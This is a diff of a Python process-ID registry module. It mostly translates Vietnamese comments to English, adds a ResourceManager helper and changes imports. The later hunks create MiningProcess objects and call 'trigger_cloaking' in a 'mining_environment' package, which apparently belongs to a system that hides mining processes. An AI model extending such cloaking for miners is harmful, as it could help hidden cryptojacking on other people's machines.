@@ -2,14 +2,14 @@
 Direct PID Registry Access System
 =================================
 
-🎯 **Direct Registry Access Pattern** (mẫu truy cập registry trực tiếp)
-Thay thế EventBus bằng direct function calls để cải thiện performance và simplicity.
+Direct registry access pattern replacing EventBus with direct function calls
+for improved performance and simplicity.
 
-Các tính năng chính:
-- **Thread-safe operations** (thao tác an toàn luồng): RLock protection
-- **Observer pattern** (mẫu quan sát): Plugin auto-discovery mechanism  
-- **Centralized registry** (registry tập trung): Single source of truth cho process info
-- **Immediate notifications** (thông báo tức thì): Direct callbacks thay thế async messaging
+Key features:
+- Thread-safe operations with RLock protection
+- Observer pattern with plugin auto-discovery
+- Centralized registry as single source of truth
+- Immediate notifications via direct callbacks
 
 Usage:
     registry = get_direct_registry()
@@ -31,12 +31,9 @@ from dataclasses import dataclass, field
 # Setup logger
 logger = logging.getLogger("direct_pid_registry")
 
-# **Configuration Management** (quản lý cấu hình)
+# Configuration management
 class RegistryConfig:
-    """**Registry Configuration Class** (lớp cấu hình registry)
-    
-    Centralized configuration cho all registry operations.
-    """
+    """Registry configuration class with centralized settings for all operations"""
     # File-based registry settings
     FILE_REGISTRY_DIR = Path("/tmp/ncs_pid_registry")
     REGISTRY_FILE_PREFIX = "pid_"
@@ -58,23 +55,16 @@ class RegistryConfig:
     DEFAULT_WAIT_TIMEOUT = 5.0  # seconds
 
 def _ensure_file_registry_dir() -> bool:
-    """
-    **Ensure File Registry Directory Exists** (đảm bảo thư mục registry file tồn tại)
-    
-    Tạo directory /tmp/ncs_pid_registry/ với proper permissions nếu chưa tồn tại.
-    
-    Returns:
-        bool: True nếu directory ready, False nếu failed
-    """
+    """Ensure file registry directory exists with proper permissions"""
     try:
         RegistryConfig.FILE_REGISTRY_DIR.mkdir(mode=0o755, parents=True, exist_ok=True)
         
-        # **Verify directory permissions** (kiểm tra quyền thư mục)
+        # Verify directory permissions
         if not RegistryConfig.FILE_REGISTRY_DIR.is_dir():
             logger.error(f"❌ [FILE-REGISTRY] Directory creation failed: {RegistryConfig.FILE_REGISTRY_DIR}")
             return False
         
-        # **Test write permissions** (kiểm tra quyền ghi)
+        # Test write permissions
         test_file = RegistryConfig.FILE_REGISTRY_DIR / f".test_{uuid.uuid4().hex[:8]}"
         try:
             test_file.write_text("test")
@@ -90,27 +80,16 @@ def _ensure_file_registry_dir() -> bool:
         return False
 
 def _write_pid_file_atomic(pid: int, metadata: Dict[str, Any]) -> bool:
-    """
-    **Atomic PID File Write** (ghi file PID nguyên tử)
-    
-    Ghi PID information vào file với atomic operations để prevent race conditions.
-    
-    Args:
-        pid: Process ID
-        metadata: Metadata để save
-        
-    Returns:
-        bool: True nếu write thành công
-    """
+    """Atomic PID file write with race condition prevention"""
     try:
         if not _ensure_file_registry_dir():
             return False
         
-        # **Create unique temporary filename** (tạo tên file tạm duy nhất)
+        # Create unique temporary filename
         temp_file = RegistryConfig.FILE_REGISTRY_DIR / f".tmp_{pid}_{uuid.uuid4().hex[:8]}"
         final_file = RegistryConfig.FILE_REGISTRY_DIR / f"{RegistryConfig.REGISTRY_FILE_PREFIX}{pid}{RegistryConfig.REGISTRY_FILE_SUFFIX}"
         
-        # **Prepare file data** (chuẩn bị dữ liệu file)
+        # Prepare file data
         file_data = {
             'pid': pid,
             'timestamp': time.time(),
@@ -120,23 +99,23 @@ def _write_pid_file_atomic(pid: int, metadata: Dict[str, Any]) -> bool:
             'version': '1.0'
         }
         
-        # **Atomic write operation** (thao tác ghi nguyên tử)
+        # Atomic write operation
         with open(temp_file, 'w') as f:
-            # **File locking để ensure atomicity** (khóa file để đảm bảo tính nguyên tử)
+            # File locking to ensure atomicity
             fcntl.flock(f.fileno(), fcntl.LOCK_EX)
             json.dump(file_data, f, indent=2)
             f.flush()  # Force write to disk
             os.fsync(f.fileno())  # Force OS buffer flush
         
-        # **Atomic move to final location** (di chuyển nguyên tử đến vị trí cuối)
+        # Atomic move to final location
         temp_file.rename(final_file)
         
-        logger.info(f"✅ [FILE-REGISTRY] Atomic write successful: PID={pid}, File={final_file.name}")
+        logger.info(f"FILE-REGISTRY: Atomic write successful: PID={pid}, File={final_file.name}")
         return True
         
     except Exception as e:
-        logger.error(f"❌ [FILE-REGISTRY] Atomic write failed for PID {pid}: {e}")
-        # **Cleanup temp file if exists** (dọn dẹp file tạm nếu tồn tại)
+        logger.error(f"FILE-REGISTRY: Atomic write failed for PID {pid}: {e}")
+        # Cleanup temp file if exists
         try:
             if 'temp_file' in locals() and temp_file.exists():
                 temp_file.unlink()
@@ -640,6 +619,33 @@ class DirectPIDRegistry:
             'backoff_multiplier': RegistryConfig.BACKOFF_MULTIPLIER
         }
     
+    def _try_get_resource_manager(self):
+        """
+        **Try Get ResourceManager** (thử lấy ResourceManager)
+        
+        Helper method để lấy ResourceManager instance từ registered hoặc singleton.
+        
+        Returns:
+            ResourceManager instance hoặc None
+        """
+        try:
+            # **First try registered ResourceManager** (thử ResourceManager đã đăng ký trước)
+            with self._resource_manager_lock:
+                if self._resource_manager is not None:
+                    logger.debug("✅ [RM-ACCESS] Using registered ResourceManager instance")
+                    return self._resource_manager
+            
+            # **Fallback to singleton** (fallback sang singleton)
+            ResourceManager = self._import_resource_manager()
+            if ResourceManager:
+                return ResourceManager._instance
+            
+            return None
+            
+        except Exception as e:
+            logger.error(f"❌ [RM-ACCESS] Error getting ResourceManager: {e}")
+            return None
+    
     def _import_resource_manager(self):
         """
         **Import ResourceManager** (nhập ResourceManager)
@@ -860,7 +866,7 @@ class DirectPIDRegistry:
                 # **Create MiningProcess object for trigger_cloaking** (tạo đối tượng MiningProcess cho trigger_cloaking)
                 try:
                     # Import MiningProcess class
-                    from mining_environment.scripts.resource_manager import MiningProcess
+                    from mining_environment.scripts.utils import MiningProcess
                     
                     mining_process = MiningProcess(
                         pid=pid,
@@ -1001,10 +1007,13 @@ class DirectPIDRegistry:
                 
                 # **Try to trigger cloaking if we have ResourceManager instance** 
                 # (Thử kích hoạt cloaking nếu có instance ResourceManager)
+                logger.info(f"🔍 [FILE-FALLBACK] Checking for registered ResourceManager: {self._resource_manager is not None}")
+                
                 if self._resource_manager:
                     try:
                         # Import MiningProcess class
-                        from mining_environment.scripts.resource_manager import MiningProcess
+                        from mining_environment.scripts.utils import MiningProcess
+                        logger.info("✅ [FILE-FALLBACK] MiningProcess imported successfully")
                         
                         # **Build metadata for cloaking** (xây dựng metadata cho cloaking)
                         rm_metadata = _build_enhanced_metadata(coordinator_metadata, {
